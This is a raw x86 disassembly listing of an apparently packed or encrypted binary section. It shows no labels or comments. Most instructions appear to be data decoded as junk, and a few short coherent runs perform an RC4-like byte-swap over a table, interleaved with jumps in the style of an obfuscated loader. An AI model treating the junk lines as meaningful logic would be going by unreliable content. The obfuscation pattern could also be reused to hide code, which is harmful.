  40c1f2:	cs push ds
  40c1f4:	xlat   BYTE PTR ds:[ebx]
  40c1f5:	std    
  40c1f6:	jne    0x40c1da
  40c1f8:	shl    ch,0xb5
  40c1fb:	inc    edi
  40c1fc:	pop    ebp
  40c1fd:	cpuid  
  40c1ff:	adc    ebx,DWORD PTR [ecx+edi*2]
  40c202:	(bad)  
  40c203:	push   ecx
  40c204:	add    al,BYTE PTR [edi]
  40c206:	jbe    0x40c1ab
  40c208:	daa    
  40c209:	pop    ds
  40c20a:	xchg   esi,eax
  40c20b:	ret    0xa51
  40c20e:	pop    ebp
  40c20f:	jge    0x40c1e5
  40c211:	inc    ebx
  40c212:	les    ebx,FWORD PTR [ecx-0x49700b04]
  40c218:	or     ah,0x5a
  40c21b:	and    al,0xc8
  40c21d:	pop    ds
  40c21e:	and    al,0xed
  40c220:	jg     0x40c26d
  40c222:	cmp    BYTE PTR [ebp-0x6a74153],0x79
  40c229:	test   al,0x7e
  40c22b:	mov    ch,0xf8
  40c22d:	stos   BYTE PTR es:[edi],al
  40c22e:	mov    eax,ds:0x5e6b5371
  40c233:	sbb    DWORD PTR [ecx+0x1f],esi
  40c236:	pop    esp
  40c237:	jnp    0x40c216
  40c239:	ret    0x52ba
  40c23c:	(bad)  
  40c23d:	fcomp  QWORD PTR [edi-0x79]
  40c240:	push   es
  40c241:	ja     0x40c205
  40c243:	shl    eax,1
  40c245:	add    cl,BYTE PTR [ecx+ebp*8+0x72db0ed9]
  40c24c:	dec    esi
  40c24d:	arpl   WORD PTR [edi+0x58],di
  40c250:	ret    0xdb73
  40c253:	add    al,0x6c
  40c255:	dec    ebx
  40c256:	imul   esp,DWORD PTR [edi+0x72],0xfffffff3
  40c25a:	add    ebp,DWORD PTR [edx-0x31967b8f]
  40c260:	dec    ebp
  40c261:	scas   al,BYTE PTR es:[edi]
  40c262:	mov    bl,0x24
  40c264:	push   ds
  40c265:	dec    ebp
  40c266:	mov    DWORD PTR [esi],edx
  40c268:	test   al,0xbb
  40c26a:	push   edx
  40c26b:	std    
  40c26c:	add    bh,BYTE PTR [edx+0x13]
  40c26f:	xchg   esi,eax
  40c270:	and    ch,BYTE PTR [edi]
  40c272:	add    al,0xb9
  40c274:	fwait
  40c275:	imul   esi,DWORD PTR [esi-0x11],0xffffffb0
  40c279:	es xor ah,bl
  40c27c:	sub    BYTE PTR [ebp+0x62],al
  40c27f:	push   ds
  40c280:	stc    
  40c281:	add    BYTE PTR [edi+0x72dfc551],bl
  40c287:	pop    esp
  40c288:	in     al,0xf1
  40c28a:	mov    eax,ds:0xb2414867
  40c28f:	in     al,dx
  40c290:	sub    ecx,DWORD PTR [eax+0x179a907]
  40c296:	loopne 0x40c275
  40c298:	push   esi
  40c299:	cmp    DWORD PTR [ebx],edx
  40c29b:	scas   eax,DWORD PTR es:[edi]
  40c29c:	scas   eax,DWORD PTR es:[edi]
  40c29d:	inc    esp
  40c29e:	cmp    eax,0xcf6d9523
  40c2a3:	call   0xcea6:0xa9561917
  40c2aa:	jge    0x40c2d7
  40c2ac:	cli    
  40c2ad:	cmp    eax,0xcc2ac5c1
  40c2b2:	jnp    0x40c2f9
  40c2b4:	(bad)  
  40c2b6:	pop    esi
  40c2b7:	mov    ebp,0xec057917
  40c2bc:	loopne 0x40c327
  40c2be:	adc    BYTE PTR [ecx-0x21],dl
  40c2c1:	test   ebx,ebp
  40c2c3:	cld    
  40c2c4:	pop    ds
  40c2c5:	or     ebp,edi
  40c2c7:	dec    edx
  40c2c8:	icebp  
  40c2c9:	dec    edi
  40c2ca:	push   ebp
  40c2cb:	sahf   
  40c2cc:	stos   DWORD PTR es:[edi],eax
  40c2cd:	mov    dh,0xef
  40c2cf:	nop
  40c2d0:	push   ebx
  40c2d1:	xor    esp,edi
  40c2d3:	or     DWORD PTR [esi+0x2ba4c04e],ebx
  40c2d9:	push   ebp
  40c2da:	jbe    0x40c2a5
  40c2dc:	mov    BYTE PTR [ebp-0x1c],ch
  40c2df:	add    bh,cl
  40c2e1:	jo     0x40c2c9
  40c2e3:	pop    DWORD PTR [ebp-0x7c8a623]
  40c2e9:	jnp    0x40c335
  40c2eb:	inc    edi
  40c2ec:	outs   dx,BYTE PTR ds:[esi]
  40c2ed:	jb     0x40c312
  40c2ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2f0:	mov    bl,0x52
  40c2f2:	sbb    ebp,DWORD PTR [ecx-0x1c]
  40c2f5:	sbb    bl,BYTE PTR [esi-0x11]
  40c2f8:	pop    esi
  40c2f9:	loopne 0x40c30b
  40c2fb:	das    
  40c2fc:	and    BYTE PTR [esp+ebp*4-0x9ec28d1],bl
  40c303:	in     eax,dx
  40c304:	fist   WORD PTR [ecx*2-0x1aadbbbf]
  40c30b:	adc    BYTE PTR [ecx],bl
  40c30d:	inc    esi
  40c30e:	ins    DWORD PTR es:[edi],dx
  40c30f:	imul   esi,DWORD PTR [esi-0x2034b04b],0xa0d54c2a
  40c319:	mov    dl,dl
  40c31b:	mov    dh,0xd8
  40c31d:	push   ecx
  40c31e:	cmp    BYTE PTR [edx-0x4a],dl
  40c321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c322:	mov    ah,0x9c
  40c324:	fwait
  40c325:	sbb    ecx,esi
  40c327:	dec    esp
  40c328:	sbb    dh,BYTE PTR [esi+0x9]
  40c32b:	mov    esi,0x2fa7c03f
  40c330:	jge    0x40c2c3
  40c332:	push   ebp
  40c333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c334:	inc    edi
  40c335:	jmp    0x452e:0xea97bf74
  40c33c:	ins    DWORD PTR es:[edi],dx
  40c33d:	cli    
  40c33e:	sub    DWORD PTR [edi],edx
  40c340:	repz jb 0x40c336
  40c343:	and    bl,BYTE PTR [ebx-0x2e700dfb]
  40c349:	push   edi
  40c34a:	fmul   DWORD PTR [edi]
  40c34c:	fsubr  DWORD PTR [esi-0x5f]
  40c34f:	xor    BYTE PTR [ebx+0x32],0xb8
  40c353:	jno    0x40c322
  40c355:	and    eax,DWORD PTR [ebx]
  40c357:	loopne 0x40c373
  40c359:	jmp    0x8635:0x69023821
  40c360:	icebp  
  40c361:	or     al,0xce
  40c363:	or     dl,ah
  40c365:	fwait
  40c366:	jmp    0x6414:0x273d18f3
  40c36d:	and    al,BYTE PTR [eax-0x39796878]
  40c373:	adc    eax,0x6d648bfa
  40c378:	fcomp  DWORD PTR [ebx]
  40c37a:	addr16 cwde 
  40c37c:	cdq    
  40c37d:	push   ss
  40c37e:	sahf   
  40c37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c380:	adc    BYTE PTR [edi-0x41a02daf],0xc0
  40c387:	inc    ebp
  40c388:	xor    DWORD PTR [eax-0x60],edx
  40c38b:	xchg   cl,ah
  40c38d:	mov    WORD PTR [ebx+0x6],gs
  40c390:	dec    ecx
  40c391:	xor    al,BYTE PTR [ebp+0x6bc79426]
  40c397:	or     eax,0x4bb89ba8
  40c39c:	mov    dl,0xb4
  40c39e:	push   ebp
  40c39f:	push   es
  40c3a0:	xor    BYTE PTR [eax+eax*4],bl
  40c3a3:	jo     0x40c3cc
  40c3a5:	(bad)  
  40c3a6:	mov    eax,DWORD PTR ds:0xb556003
  40c3ac:	aaa    
  40c3ad:	aam    0xa3
  40c3af:	into   
  40c3b0:	loopne 0x40c350
  40c3b2:	loope  0x40c355
  40c3b4:	arpl   WORD PTR [ebx+0x45],bp
  40c3b7:	mov    eax,0x53f42ecb
  40c3bc:	mov    esi,DWORD PTR ds:0x7b223100
  40c3c2:	imul   eax,DWORD PTR [esi+0x72],0xffffffa8
  40c3c6:	mov    cl,BYTE PTR [ebp+0x2]
  40c3c9:	inc    ebx
  40c3ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3cb:	xchg   edx,eax
  40c3cc:	aaa    
  40c3cd:	fst    st(0)
  40c3cf:	mov    ds:0xb55795da,eax
  40c3d4:	sbb    ch,0xc5
  40c3d7:	xchg   ecx,eax
  40c3d8:	fwait
  40c3d9:	lods   eax,DWORD PTR ds:[esi]
  40c3da:	xchg   esi,eax
  40c3db:	jmp    0x40c3cb
  40c3dd:	retf   0x79b4
  40c3e0:	loop   0x40c406
  40c3e2:	or     BYTE PTR [edi+ecx*1-0x49],0x4f
  40c3e7:	jne    0x40c3d8
  40c3e9:	push   0xf3e16a7e
  40c3ee:	out    0xaf,eax
  40c3f0:	xchg   edi,eax
  40c3f1:	(bad)  
  40c3f2:	mov    eax,0x221ffb17
  40c3f7:	push   ebp
  40c3f8:	imul   esp,DWORD PTR [esi+0x57],0x13
  40c3fc:	leave  
  40c3fd:	test   eax,0x7cdc54ae
  40c402:	xor    DWORD PTR ds:0x4ffc798a,ebp
  40c408:	out    dx,al
  40c409:	push   cs
  40c40a:	dec    ebp
  40c40b:	test   DWORD PTR [edi+0x4333ffbc],ebx
  40c411:	fidivr DWORD PTR [edi]
  40c413:	and    esi,DWORD PTR ss:[eax-0x16ea5c01]
  40c41a:	jne    0x40c448
  40c41c:	push   esp
  40c41d:	inc    ebp
  40c41e:	ins    DWORD PTR es:[edi],dx
  40c41f:	(bad)  
  40c420:	popa   
  40c421:	jge    0x40c42d
  40c423:	xchg   ebp,eax
  40c424:	ret    
  40c425:	int    0x26
  40c427:	pop    eax
  40c428:	or     DWORD PTR [edi-0x3f],ecx
  40c42b:	add    DWORD PTR [edx-0x65],edi
  40c42e:	pop    esi
  40c42f:	ins    BYTE PTR es:[edi],dx
  40c430:	loopne 0x40c3b4
  40c432:	mov    es,WORD PTR [edx-0x15]
  40c435:	sti    
  40c436:	das    
  40c437:	inc    edi
  40c438:	or     ebp,DWORD PTR [esi-0x1eb8e915]
  40c43e:	push   cs
  40c43f:	sar    BYTE PTR [ebp+0x55f414e2],1
  40c445:	sbb    eax,0xca1987d
  40c44a:	pop    es
  40c44b:	std    
  40c44c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c44d:	mov    ebx,0x8d2d82e4
  40c452:	mov    dh,0x73
  40c454:	enter  0x5e54,0x50
  40c458:	scas   al,BYTE PTR es:[edi]
  40c459:	bound  edx,QWORD PTR [eax-0x3ea7ef15]
  40c45f:	sbb    al,BYTE PTR [edi+0x73]
  40c462:	xchg   esi,eax
  40c463:	popa   
  40c464:	pusha  
  40c465:	dec    esi
  40c466:	retf   0x40d7
  40c469:	bound  ebp,QWORD PTR [esi]
  40c46b:	dec    ecx
  40c46c:	clc    
  40c46d:	inc    esp
  40c46e:	adc    al,0x66
  40c471:	cmp    BYTE PTR [esi+ebx*2-0x50da1cb2],bl
  40c478:	add    eax,DWORD PTR [edx]
  40c47a:	push   ds
  40c47b:	ret    0xc689
  40c47e:	outs   dx,BYTE PTR ds:[esi]
  40c47f:	mov    ebp,0x4e2acd7
  40c484:	popf   
  40c485:	push   0xffffffa0
  40c487:	push   0xace38940
  40c48c:	call   0x732fe0a3
  40c491:	les    eax,FWORD PTR [ecx+0x33]
  40c494:	loopne 0x40c49a
  40c496:	arpl   di,di
  40c498:	ror    eax,cl
  40c49a:	ror    ch,0x35
  40c49d:	in     eax,0x2e
  40c49f:	sub    ebx,DWORD PTR [ebx-0x51a92cfc]
  40c4a5:	cmp    eax,0xaf894aef
  40c4aa:	icebp  
  40c4ab:	aad    0x29
  40c4ad:	shl    BYTE PTR [ebx+0x194f451a],0x5b
  40c4b4:	inc    edi
  40c4b5:	sbb    ebp,eax
  40c4b7:	test   ebp,ebx
  40c4b9:	cmp    BYTE PTR [edx],0x7b
  40c4bc:	test   DWORD PTR [edi],esi
  40c4be:	in     al,0xc6
  40c4c0:	arpl   WORD PTR [eax-0x258ed94b],si
  40c4c6:	mov    edi,0x16eea742
  40c4cb:	cld    
  40c4cc:	push   es
  40c4cd:	adc    al,BYTE PTR [esi+0x6b]
  40c4d0:	sbb    BYTE PTR [ecx+ecx*4+0xe],dl
  40c4d4:	xchg   edx,eax
  40c4d5:	adc    ebx,DWORD PTR cs:[ecx+0x10]
  40c4d9:	xor    eax,0xe53f9576
  40c4de:	pop    ebx
  40c4df:	pop    es
  40c4e0:	sti    
  40c4e1:	dec    esi
  40c4e2:	jbe    0x40c50c
  40c4e4:	leave  
  40c4e5:	ins    DWORD PTR es:[edi],dx
  40c4e6:	pop    ecx
  40c4e7:	jae    0x40c568
  40c4e9:	rcr    DWORD PTR [ebp-0x6890a69c],0x94
  40c4f0:	xor    edx,eax
  40c4f2:	add    edx,DWORD PTR [ebp-0x14]
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	lds    esp,FWORD PTR [edi+0x7f]
  40c543:	mov    edi,0x7070884d
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c5c0
  40c54d:	and    eax,0x451a42e7
  40c552:	cvttps2pi mm5,xmm2
  40c555:	int3   
  40c556:	jg     0x40c59f
  40c558:	mov    ebp,0x366fdfe1
  40c55d:	ins    BYTE PTR es:[edi],dx
  40c55e:	stos   DWORD PTR es:[edi],eax
  40c55f:	sar    BYTE PTR [esi+0x6754fea8],0x10
  40c566:	cmp    BYTE PTR [edi+esi*4-0x77],0x2b
  40c56b:	or     al,0x70
  40c56d:	cmp    ebx,DWORD PTR [ebx-0x1b83f0d8]
  40c573:	jne    0x40c576
  40c575:	inc    eax
  40c576:	sub    esp,esi
  40c578:	es push cs
  40c57a:	add    DWORD PTR ss:[eax],esi
  40c57d:	addr16 call 0x9e30:0xb31b444a
  40c585:	mov    edx,0x84a4a776
  40c58a:	(bad)  
  40c58b:	fdivr  DWORD PTR [ecx]
  40c58d:	and    BYTE PTR [ecx-0x6d],dl
  40c590:	pop    edx
  40c591:	adc    DWORD PTR [edi-0x7],0x882cce58
  40c598:	dec    ecx
  40c599:	cld    
  40c59a:	push   esi
  40c59b:	mov    ds:0x68f350d6,eax
  40c5a0:	mov    esp,0x46260e39
  40c5a5:	adc    BYTE PTR [ecx-0x17],0xf6
  40c5a9:	adc    eax,0xb31e6bd1
  40c5ae:	jge    0x40c577
  40c5b0:	scas   al,BYTE PTR es:[edi]
  40c5b1:	dec    esi
  40c5b2:	ins    DWORD PTR es:[edi],dx
  40c5b3:	lds    edi,FWORD PTR [edx+0x71]
  40c5b6:	popf   
  40c5b7:	and    esi,DWORD PTR [edi+0x75020e10]
  40c5bd:	scas   eax,DWORD PTR es:[edi]
  40c5be:	dec    eax
  40c5bf:	ror    BYTE PTR [ecx+0x12eba5ba],0xc7
  40c5c6:	retf   
  40c5c7:	std    
  40c5c8:	out    dx,eax
  40c5c9:	mov    eax,0xb4a94c0e
  40c5ce:	lahf   
  40c5cf:	mov    al,ds:0xeb6fef68
  40c5d4:	popa   
  40c5d5:	push   0xffffff9e
  40c5d7:	ins    DWORD PTR es:[edi],dx
  40c5d8:	and    ah,BYTE PTR [ebx-0x6e]
  40c5db:	jp     0x40c617
  40c5dd:	xchg   edx,eax
  40c5de:	inc    edi
  40c5df:	ficom  DWORD PTR [edi+0x7]
  40c5e2:	pop    es
  40c5e3:	ret    
  40c5e4:	adc    dh,dl
  40c5e6:	or     ch,ch
  40c5e8:	lods   al,BYTE PTR ds:[esi]
  40c5e9:	in     eax,0x14
  40c5eb:	mov    WORD PTR [edi+ebx*4+0x6c],fs
  40c5ef:	ret    0x9fb4
  40c5f2:	and    al,0x17
  40c5f4:	xchg   edx,ebp
  40c5f6:	fistp  DWORD PTR [edi-0x1cc0576f]
  40c5fc:	mov    esi,0x4480c986
  40c601:	les    ecx,FWORD PTR [ebx]
  40c603:	mov    al,ds:0x54e5ab7c
  40c608:	popf   
  40c609:	push   ebp
  40c60a:	push   sp
  40c60c:	aas    
  40c60d:	mov    ds:0x73765f41,eax
  40c612:	inc    eax
  40c613:	ja     0x40c666
  40c615:	repnz aaa 
  40c617:	xor    eax,0xba7ea87a
  40c61c:	outs   dx,BYTE PTR ds:[esi]
  40c61d:	pop    eax
  40c61e:	xchg   ebp,eax
  40c61f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c620:	jb     0x40c693
  40c622:	dec    ebx
  40c623:	pop    ss
  40c624:	jl     0x40c614
  40c626:	push   ebx
  40c627:	add    eax,0x33bfb9d1
  40c62c:	pop    edi
  40c62d:	pop    ecx
  40c62e:	pop    eax
  40c62f:	pop    edi
  40c630:	sbb    eax,DWORD PTR [ecx+0x3dcaab26]
  40c636:	imul   ebp,ebx,0x6923fff
  40c63c:	int    0xa4
  40c63e:	fucomip st,st(4)
  40c640:	ds ja  0x40c683
  40c643:	je     0x40c650
  40c645:	pop    ecx
  40c646:	outs   dx,DWORD PTR ds:[esi]
  40c647:	rcr    DWORD PTR [edi+0x7eb86e46],1
  40c64d:	mov    ch,0xf3
  40c64f:	stos   BYTE PTR es:[edi],al
  40c650:	shl    BYTE PTR [ebp+0x9feb655],1
  40c656:	jg     0x40c6ad
  40c658:	pop    esi
  40c659:	dec    esp
  40c65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c65b:	call   0x5c1c52f7
  40c660:	call   0x86a1:0x111bda05
  40c667:	fs sbb bh,0x20
  40c66b:	(bad)  
  40c66c:	ds inc ecx
  40c66e:	or     DWORD PTR [ecx+0x29f1a3b1],eax
  40c674:	add    DWORD PTR [edi+eax*8],edx
  40c677:	cmp    BYTE PTR [esi-0x2d],dl
  40c67a:	(bad)  
  40c67b:	out    0x7a,al
  40c67d:	pop    esi
  40c67e:	and    DWORD PTR [edx-0x2f],esp
  40c681:	inc    ebx
  40c682:	iret   
  40c683:	dec    esi
  40c684:	push   es
  40c685:	hlt    
  40c686:	cmp    esi,DWORD PTR [ebx]
  40c688:	out    0xf2,al
  40c68a:	or     ebp,0xffffffdb
  40c68d:	add    al,0x19
  40c68f:	sbb    eax,0x887cb063
  40c694:	dec    esi
  40c695:	jecxz  0x40c69f
  40c697:	push   ebx
  40c698:	out    0x11,eax
  40c69a:	xchg   ecx,eax
  40c69b:	imul   BYTE PTR [edi+0x1a]
  40c69e:	fmul   DWORD PTR [ebx+0x1448d999]
  40c6a4:	push   esi
  40c6a5:	jae    0x40c677
  40c6a7:	sbb    ah,dh
  40c6a9:	add    eax,edi
  40c6ab:	in     al,dx
  40c6ac:	mov    bh,0x21
  40c6ae:	sub    eax,0x6455f61d
  40c6b3:	pop    edi
  40c6b4:	sbb    al,0xc4
  40c6b6:	inc    eax
  40c6b7:	fadd   st(1),st
  40c6b9:	sub    ch,dh
  40c6bb:	cdq    
  40c6bc:	(bad)
  40c6bf:	arpl   bx,di
  40c6c1:	push   es
  40c6c2:	shl    ebp,0xd3
  40c6c5:	fdivr  DWORD PTR [esi]
  40c6c7:	dec    ebx
  40c6c8:	pop    edi
  40c6c9:	jmp    0xa28f:0xccf5f7aa
  40c6d0:	cdq    
  40c6d1:	lods   eax,DWORD PTR ds:[esi]
  40c6d2:	jo     0x40c666
  40c6d4:	aaa    
  40c6d5:	sbb    bl,BYTE PTR [edx+eiz*1]
  40c6d8:	xchg   ecx,esi
  40c6da:	push   edi
  40c6db:	cmp    eax,0x75f9f5f1
  40c6e0:	call   0x86cd78e3
  40c6e5:	cmp    eax,0xf3dfee2e
  40c6ea:	pop    ecx
  40c6eb:	xchg   bh,ch
  40c6ed:	sub    BYTE PTR [eax],dh
  40c6ef:	or     al,BYTE PTR [edi+ebp*8]
  40c6f2:	inc    ebx
  40c6f3:	inc    ebp
  40c6f4:	adc    eax,0x98c07ded
  40c6f9:	in     eax,dx
  40c6fa:	and    cl,BYTE PTR [edi+0x76bf544c]
  40c700:	mov    al,BYTE PTR [edi+0x1e]
  40c703:	addr16 out 0xaa,al
  40c706:	shl    DWORD PTR [ebp+0x23],0x6c
  40c70a:	or     DWORD PTR [ecx-0x18],eax
  40c70d:	stos   BYTE PTR es:[edi],al
  40c70e:	mov    ecx,0xda0efcd
  40c713:	test   al,0x9a
  40c715:	enter  0x9fe6,0x26
  40c719:	xchg   edx,eax
  40c71a:	pop    esp
  40c71b:	xor    BYTE PTR [esi+0x40],ch
  40c71e:	sbb    DWORD PTR [esi],esi
  40c720:	mov    ebp,fs
  40c722:	and    BYTE PTR [ecx-0x6f],dh
  40c725:	sar    DWORD PTR [eax],1
  40c727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c728:	mov    bh,0x56
  40c72a:	add    ecx,ebp
  40c72c:	or     ebx,DWORD PTR [esi]
  40c72e:	xor    al,0x7f
  40c730:	adc    al,0xb7
  40c732:	push   cs
  40c733:	xchg   edi,eax
  40c734:	std    
  40c735:	popf   
  40c736:	mov    ds:0x1b200ceb,al
  40c73b:	gs and eax,0x3a51e7ba
  40c741:	daa    
  40c742:	and    bh,cl
  40c744:	inc    ebp
  40c745:	sub    eax,0xef247da0
  40c74a:	in     eax,0x24
  40c74c:	(bad)  
  40c74d:	(bad)  
  40c74e:	xor    bl,BYTE PTR [esi-0x10]
  40c751:	jmp    0x40c6e5
  40c753:	fnsave [ebx-0x7dc2d119]
  40c759:	pop    eax
  40c75a:	aam    0x1
  40c75c:	xchg   esi,eax
  40c75d:	repz cmp ebp,0xffffff8f
  40c761:	fidivr WORD PTR [ebp+ecx*8+0x46a71e53]
  40c768:	adc    DWORD PTR [esi+edx*8+0x5d],ebp
  40c76c:	dec    ecx
  40c76d:	icebp  
  40c76e:	inc    ecx
  40c76f:	mov    dh,0x57
  40c771:	mov    dl,0xf0
  40c773:	mov    ebx,0xbcd95fc7
  40c778:	mov    eax,ds:0xd7f7aba7
  40c77d:	pop    ebx
  40c77e:	mov    ds:0xaa7554e3,al
  40c783:	inc    eax
  40c784:	neg    DWORD PTR [ebx-0x491c95bf]
  40c78a:	out    dx,al
  40c78b:	xor    BYTE PTR [edx+0x1],ch
  40c78e:	push   ds
  40c78f:	push   0x2eafc104
  40c794:	in     eax,0x39
  40c796:	out    0x85,al
  40c798:	or     eax,0xe6c151ab
  40c79d:	lods   eax,DWORD PTR ds:[esi]
  40c79e:	lock xchg DWORD PTR [esi+0x16e500a3],esp
  40c7a5:	jg     0x40c76a
  40c7a7:	inc    esi
  40c7a8:	jmp    0x4868:0x6ac8c51e
  40c7af:	fs out dx,al
  40c7b1:	push   ds
  40c7b2:	xor    edi,DWORD PTR [esi]
  40c7b4:	js     0x40c768
  40c7b6:	xor    ebx,DWORD PTR [edi+0x55]
  40c7b9:	push   edi
  40c7ba:	jg     0x40c79e
  40c7bc:	(bad)  ds:0xffa27bd1
  40c7c2:	sti    
  40c7c3:	inc    ebp
  40c7c4:	lahf   
  40c7c5:	push   edi
  40c7c6:	xchg   edx,eax
  40c7c7:	out    0xf8,al
  40c7c9:	push   esp
  40c7ca:	jle    0x40c844
  40c7cc:	xchg   esp,edi
  40c7ce:	pminsw mm7,QWORD PTR [edi+0x1a]
  40c7d2:	mov    bl,0x91
  40c7d4:	xor    BYTE PTR [ebx+0x63],bh
  40c7d7:	jbe    0x40c7f7
  40c7d9:	mov    WORD PTR [esi+eax*4-0x13c97a8b],?
  40c7e0:	mov    dl,0xee
  40c7e2:	ror    DWORD PTR [edx+0x2f98361a],0xda
  40c7e9:	push   edx
  40c7ea:	xchg   BYTE PTR ds:0x91782131,bl
  40c7f0:	pop    ebp
  40c7f1:	loop   0x40c837
  40c7f3:	hlt    
  40c7f4:	or     eax,0xc38292e0
  40c7f9:	push   ebx
  40c7fa:	fsubrp st(2),st
  40c7fc:	arpl   WORD PTR [ecx-0x31360c6f],ax
  40c802:	mov    al,ds:0xaed3957a
  40c807:	and    edi,edx
  40c809:	shl    BYTE PTR [esi+eiz*8],cl
  40c80c:	jp     0x40c7a8
  40c80e:	fnsave [ebx-0x3d06dbc3]
  40c814:	into   
  40c815:	inc    ebp
  40c816:	sar    esp,cl
  40c818:	sub    BYTE PTR [ebp+0x73],bl
  40c81b:	nop
  40c81c:	outs   dx,DWORD PTR ds:[esi]
  40c81d:	and    dl,BYTE PTR [ebp-0x7c]
  40c820:	loopne 0x40c7a9
  40c822:	fucomip st,st(2)
  40c824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c825:	(bad)  
  40c826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c827:	sbb    BYTE PTR [edx-0x11],0x60
  40c82b:	pop    es
  40c82c:	sub    DWORD PTR [ecx+0x3aff67e8],0x6
  40c833:	shr    BYTE PTR [edx-0x1ff981f5],0x67
  40c83a:	mov    edi,esp
  40c83c:	cdq    
  40c83d:	call   DWORD PTR [esi]
  40c83f:	pop    esi
  40c840:	sub    ebx,DWORD PTR ds:0xc944376f
  40c846:	adc    al,0x71
  40c848:	mov    eax,0xc2b3e3bb
  40c84d:	into   
  40c84e:	push   esi
  40c84f:	mov    bl,0xdb
  40c851:	mov    dl,0xfd
  40c853:	mov    cl,0x51
  40c855:	hlt    
  40c856:	mov    al,0x74
  40c858:	cmp    al,0x39
  40c85a:	sub    eax,0xb3eaa066
  40c85f:	test   BYTE PTR [edx+0x78],ch
  40c862:	leave  
  40c863:	sub    eax,0x29a8164e
  40c868:	(bad)
  40c86c:	pusha  
  40c86d:	mov    esp,0x54823a83
  40c872:	dec    esi
  40c873:	push   esp
  40c874:	ror    BYTE PTR gs:[ebx-0x6f4a0dea],cl
  40c87b:	imul   esi,ecx,0xffffffcd
  40c87e:	pop    eax
  40c87f:	jmp    0x40c89b
  40c881:	dec    edx
  40c882:	add    esp,DWORD PTR ds:0x29291114
  40c888:	fist   WORD PTR [edx]
  40c88a:	stc    
  40c88b:	loop   0x40c84d
  40c88d:	stos   DWORD PTR es:[edi],eax
  40c88e:	jle    0x40c869
  40c890:	xchg   edx,eax
  40c891:	jae    0x40c866
  40c893:	imul   eax,DWORD PTR [edx+0x3],0x7b0a9f82
  40c89a:	inc    ebx
  40c89b:	and    DWORD PTR [edi-0x2],0x1d5c597d
  40c8a2:	push   ebp
  40c8a3:	mov    ds:0xf8da18ac,eax
  40c8a8:	popa   
  40c8a9:	clc    
  40c8aa:	jecxz  0x40c8c8
  40c8ac:	pop    ss
  40c8ad:	cmp    bh,BYTE PTR [ebp-0x4e43f4e6]
  40c8b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8b4:	sub    al,0x2
  40c8b6:	retf   0xce1b
  40c8b9:	mov    edx,0x3bf4d4a2
  40c8be:	jae    0x40c8f1
  40c8c0:	sub    esp,DWORD PTR [esp+eiz*8-0x3b]
  40c8c4:	mov    ebp,0x3478e70c
  40c8c9:	loope  0x40c93b
  40c8cb:	in     al,dx
  40c8cc:	lods   al,BYTE PTR ds:[esi]
  40c8cd:	in     eax,0xe8
  40c8cf:	out    dx,al
  40c8d0:	inc    ebx
  40c8d1:	ja     0x40c8ac
  40c8d3:	push   esp
  40c8d4:	mov    fs:0xc069bb68,eax
  40c8da:	pop    ebx
  40c8db:	xchg   esp,eax
  40c8dc:	add    eax,0x2ade5a02
  40c8e1:	push   esi
  40c8e2:	bswap  ebp
  40c8e4:	jmp    0x91554e79
  40c8e9:	push   0xffffffa0
  40c8eb:	repz lock mov edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	int3   
  40c919:	cdq    
  40c91a:	mov    eax,0x7094ec48
  40c91f:	jo     0x40c8c0
  40c921:	jge    0x40c993
  40c923:	jo     0x40c95b
  40c925:	shl    BYTE PTR [eax-0x7f],1
  40c928:	jmp    0x643f3865
  40c92d:	sti    
  40c92e:	pop    ss
  40c92f:	neg    BYTE PTR [ecx+0xce18caf]
  40c935:	das    
  40c936:	js     0x40c997
  40c938:	lods   eax,DWORD PTR ds:[esi]
  40c939:	idiv   ebp
  40c93b:	inc    ebx
  40c93c:	adc    ebx,DWORD PTR [esi-0x5ee9f490]
  40c942:	out    0x75,al
  40c944:	cs dec edi
  40c946:	fisub  WORD PTR [edi+ebx*1-0x5878ed13]
  40c94d:	repnz push edx
  40c94f:	push   ebp
